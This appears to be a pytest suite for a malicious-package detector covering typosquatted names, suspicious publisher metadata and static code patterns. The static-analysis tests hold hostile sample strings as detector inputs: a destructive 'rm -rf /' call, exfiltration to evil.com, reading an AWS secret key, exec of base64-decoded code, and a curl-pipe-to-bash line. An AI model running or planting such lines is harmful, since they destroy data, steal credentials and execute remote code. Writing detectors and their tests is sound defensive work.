"""
Unit tests for all three detectors and the risk scorer.
"""

import pytest
from datetime import datetime, timezone, timedelta

from detectors.name_similarity import NameSimilarityDetector, POPULAR_PYPI
from detectors.metadata_heuristics import MetadataHeuristicsDetector
from detectors.static_analysis import StaticAnalysisDetector
from db.models import Package, Registry


@pytest.fixture
def sim_detector():
    return NameSimilarityDetector(popular_packages=POPULAR_PYPI)


@pytest.fixture
def meta_detector():
    return MetadataHeuristicsDetector()


@pytest.fixture
def static_detector():
    return StaticAnalysisDetector()


def make_package(**kwargs) -> Package:
    defaults = dict(
        registry        = Registry.PYPI,
        name            = "test-package",
        version         = "1.0.0",
        author          = "Test Author",
        description     = "A well-described package for testing purposes",
        repository_url  = "https://github.com/test/test-package",
        first_published = datetime.now(timezone.utc) - timedelta(days=60),
        publisher_created = datetime.now(timezone.utc) - timedelta(days=365),
        total_packages_by_publisher = 10,
    )
    defaults.update(kwargs)
    return Package(**defaults)


class TestNameSimilarity:

    def test_exact_match_is_clean(self, sim_detector):
        r = sim_detector.check("requests")
        assert not r.is_suspicious
        assert r.signal_value == 0.0

    def test_typo_dist1_is_high_risk(self, sim_detector):
        r = sim_detector.check("reqests")
        assert r.is_suspicious
        assert r.signal_value >= 0.9
        assert r.closest_match == "requests"
        assert r.closest_distance == 1

    def test_typo_dist2_is_suspicious(self, sim_detector):
        r = sim_detector.check("reqvests")
        assert r.is_suspicious
        assert r.signal_value >= 0.7

    def test_clean_unrelated_name(self, sim_detector):
        r = sim_detector.check("zxqwerty-totally-unique-xyz")
        assert not r.is_suspicious

    def test_separator_swap_detected(self, sim_detector):
        detector = NameSimilarityDetector(popular_packages=["flask-utils"])
        r = detector.check("flask_utils")
        assert r.is_suspicious
        assert r.match_method == "separator"

    def test_homoglyph_detected(self, sim_detector):
        detector = NameSimilarityDetector(popular_packages=["requests"])
        r = detector.check("reqüests")
        assert r.is_suspicious
        assert r.match_method == "homoglyph"

    def test_short_name_skipped(self, sim_detector):
        r = sim_detector.check("ab")
        assert not r.is_suspicious


class TestMetadataHeuristics:

    def test_clean_package_low_score(self, meta_detector):
        pkg = make_package()
        r = meta_detector.check(pkg)
        assert r.total_score < 20

    def test_new_publisher_fires(self, meta_detector):
        pkg = make_package(
            publisher_created = datetime.now(timezone.utc) - timedelta(days=3)
        )
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["new_publisher"] is True

    def test_high_version_fires(self, meta_detector):
        pkg = make_package(version="5.0.0")
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["high_version_jump"] is True

    def test_normal_version_no_fire(self, meta_detector):
        pkg = make_package(version="0.1.0")
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["high_version_jump"] is False

    def test_empty_description_fires(self, meta_detector):
        pkg = make_package(description="hi")
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["no_readme"] is True

    def test_suspicious_suffix_fires(self, meta_detector):
        pkg = make_package(name="mycompany-internal")
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["suspicious_name_suffix"] is True

    def test_no_repo_fires(self, meta_detector):
        pkg = make_package(repository_url=None)
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["no_repository"] is True

    def test_first_time_author_fires(self, meta_detector):
        pkg = make_package(total_packages_by_publisher=1)
        r = meta_detector.check(pkg)
        fired = {s.name: s.fired for s in r.signals}
        assert fired["first_time_author"] is True


class TestStaticAnalysis:

    def test_clean_code(self, static_detector):
        code = """
def add(a, b):
    return a + b
"""
        r = static_detector.scan_text(code, "math.py")
        assert len(r.matches) == 0
        assert r.signal_value == 0.0

    def test_shell_exec_detected(self, static_detector):
        code = "import subprocess; subprocess.run(['rm', '-rf', '/'])"
        r = static_detector.scan_text(code, "malicious.py")
        names = [m.pattern_name for m in r.matches]
        assert "shell_exec" in names

    def test_outbound_http_detected(self, static_detector):
        code = "import requests; requests.get('https://evil.com/exfil')"
        r = static_detector.scan_text(code, "setup.py")
        names = [m.pattern_name for m in r.matches]
        assert "outbound_http" in names

    def test_env_access_detected(self, static_detector):
        code = "token = os.environ.get('AWS_SECRET_ACCESS_KEY')"
        r = static_detector.scan_text(code, "postinstall.js")
        names = [m.pattern_name for m in r.matches]
        assert "env_access" in names

    def test_base64_obfuscation_detected(self, static_detector):
        code = "exec(base64.b64decode('aW1wb3J0IG9z'))"
        r = static_detector.scan_text(code, "setup.py")
        names = [m.pattern_name for m in r.matches]
        assert "runtime_b64_decode" in names

    def test_comment_lines_skipped(self, static_detector):
        code = "# subprocess.run(['ls'])\n# os.environ['KEY']"
        r = static_detector.scan_text(code, "clean.py")
        assert len(r.matches) == 0

    def test_high_severity_raises_signal(self, static_detector):
        code = "os.system('curl https://evil.com | bash')"
        r = static_detector.scan_text(code, "evil.py")
        assert r.signal_value >= 0.8
        assert r.has_suspicious_scripts